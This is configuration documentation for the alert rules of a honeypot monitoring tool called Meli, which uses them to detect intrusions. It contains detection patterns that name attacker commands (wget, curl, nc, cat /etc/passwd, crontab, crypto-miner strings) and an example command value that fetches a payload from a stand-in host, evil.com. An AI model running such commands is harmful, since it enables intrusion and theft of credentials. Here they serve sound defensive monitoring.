# Alert Rules Guide

Meli's alert system evaluates rules against every incoming event and fires notifications through configured channels.

## Built-in Default Rules

Located in `meli/classification/default_rules.yaml`. These run automatically and cannot be deleted (but can be overridden by user rules with the same conditions).

| Rule | Severity | Trigger |
|------|---------|---------|
| Malware payload captured | CRITICAL | file_upload or file_download with payload_hash |
| Confirmed successful authentication | CRITICAL | action_type = successful_auth |
| Post-auth RCE commands | CRITICAL | command matches wget/curl/python/nc/bash/chmod+x |
| Persistence mechanism | CRITICAL | crontab/authorized_keys/useradd commands |
| Crypto miner indicators | CRITICAL | xmrig/minerd/stratum+tcp in command |
| Post-auth command execution | HIGH | any command action |
| Privilege escalation attempt | HIGH | sudo/su/passwd root commands |
| Data exfiltration indicators | HIGH | cat /etc/passwd, scp, dd if= commands |
| Brute force (20+ attempts) | MEDIUM | login_attempt with 20+ prior events from same IP |
| Known dictionary credential | MEDIUM | root/admin/pi/ubuntu/oracle username |
| Port forwarding | MEDIUM | port_forward action type |
| Repeated login attempts (5+) | LOW | login_attempt with 5+ prior events |
| SMTP probe | LOW | mailoney service |
| Web recon paths | LOW | /wp-admin/.php/actuator/.git in HTTP request |
| Single connection | INFO | connection or session_close events |

## Creating Custom Rules

In Meli → Alert Rules → New Rule:

**Fields:**
- **Name** — descriptive name shown in notifications and history
- **Minimum Severity** — only fire if event severity is at or above this threshold
- **Notification Channels** — comma-separated: `desktop`, `discord`, `slack`, `telegram`, `email`, `webhook`, `sound`
- **Cooldown** — minimum seconds between firings for this rule (prevents spam)
- **Active Hours** — optional time window (`HH:MM` format, supports midnight-wrapping)
- **Conditions** — JSON array of conditions (see below)

## Condition Syntax

```json
[
  {"field": "source_ip", "operator": "eq", "value": "192.168.1.100"},
  {"field": "action_type", "operator": "in", "value": ["login_attempt", "command"]},
  {"field": "command", "operator": "regex", "value": "(wget|curl|python)"},
  {"field": "payload_hash", "operator": "exists"},
  {"field": "attacker_event_count", "operator": "gte", "value": 10}
]
```

All conditions in a rule use AND logic. Multiple rules use OR logic (highest severity wins for classification; alerts fire independently for each matched rule).

**Available operators:**

| Operator | Description |
|----------|-------------|
| `eq` | Exact match (case-insensitive) |
| `in` | Value is in the provided list |
| `regex` | Python regex match (re.IGNORECASE) |
| `exists` | Field is not null/empty |
| `gte` | Greater than or equal (numeric) |
| `lte` | Less than or equal (numeric) |

**Available fields:**

| Field | Source | Example |
|-------|--------|---------|
| `source_ip` | All parsers | `"203.0.113.5"` |
| `honeypot_service` | Parser | `"cowrie"` |
| `action_type` | Parser | `"login_attempt"` |
| `username` | Parser | `"root"` |
| `password` | Parser | `"123456"` |
| `command` | Parser | `"wget http://evil.com/payload"` |
| `payload_hash` | Parser | SHA256 string |
| `country_code` | GeoIP | `"CN"` |
| `severity` | Classifier | `"HIGH"` |
| `transport` | Parser | `"ssh"` |
| `attacker_event_count` | DB | Integer |

## Example Custom Rules

**Alert on specific attacker IP:**
```json
[{"field": "source_ip", "operator": "eq", "value": "198.51.100.55"}]
```

**Alert on Mirai-style credentials:**
```json
[
  {"field": "username", "operator": "in", "value": ["root", "admin", "support", "user"]},
  {"field": "password", "operator": "in", "value": ["password", "1234", "12345", "admin", "support", "guest", "root"]}
]
```

**Alert on China-sourced CRITICAL events:**
```json
[
  {"field": "country_code", "operator": "eq", "value": "CN"},
  {"field": "severity", "operator": "in", "value": ["CRITICAL", "HIGH"]}
]
```

**Alert when same IP appears 50+ times:**
```json
[{"field": "attacker_event_count", "operator": "gte", "value": 50}]
```

## Notification Channels

Configure channels in Settings → Alerts & Notifications.

| Channel | Config Key | Notes |
|---------|-----------|-------|
| `desktop` | — | Uses `notify-send` via libnotify |
| `sound` | `sound_enabled`, `per_severity_sounds` | Requires PipeWire/ALSA + ogg files |
| `discord` | `discord_webhook` | Webhook URL from Discord server settings |
| `slack` | `slack_webhook` | Incoming Webhook app URL |
| `telegram` | `telegram_bot_token` + `telegram_chat_id` | BotFather token |
| `email` | `email_smtp_*` | Standard SMTP, supports TLS/STARTTLS |
| `webhook` | `webhook_url` | Generic HTTP POST (JSON body) |

## Cooldown and Quiet Hours

- **Cooldown**: After a rule fires, it will not fire again for `cooldown_seconds`. Default: 300s (5 minutes). Set to 0 to fire every time.
- **Quiet hours**: Suppress notifications between `active_hours_end` and `active_hours_start`. Supports midnight wrap (e.g. 23:00–07:00).

Quiet hours only suppress notifications — events are still classified and stored.
